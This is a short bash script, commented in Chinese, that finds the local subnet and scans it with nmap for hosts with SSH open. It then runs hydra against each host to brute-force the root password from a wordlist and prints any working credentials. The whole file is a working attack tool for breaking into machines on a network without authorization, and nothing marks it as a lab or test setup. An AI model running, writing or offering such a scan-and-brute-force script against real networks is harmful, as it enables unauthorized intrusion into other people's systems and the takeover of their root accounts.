#!/bin/bash

# 显示本机IP，使用CIDR显示内网范围
local_ip=`ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
local_netmask=`ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $4}'|tr -d "addr:"`
echo 本机IP为：$local_ip
echo 内网子网掩码为：$local_netmask

# 输出扫描范围
ip_range=${local_ip%.*}.0/24
echo 扫描范围：$ip_range

# 先使用nmap进行内网主机的探测
echo "开始扫描存活主机"
# 利用管道提取出开放22端口的IP地址到ip.txt文件中
sudo nmap -vv -n -p22 $ip_range | grep "Discovered open port" | awk {'print $6'} > ./ip.txt
# 从ip.txt文件中读取存活主机
echo -e "\n"
echo 存活主机IP：
while read line
do
    echo $line
done < ./ip.txt
echo -e "\n"
# 使用hydra爆破启用ssh服务的IP
cat ./ip.txt | while read line
do 
    echo "Current IP: ${line}"
    hydra -l root -P ./password.txt -t 6 -vV $line ssh | grep "host:" 
    echo -e "\n"
done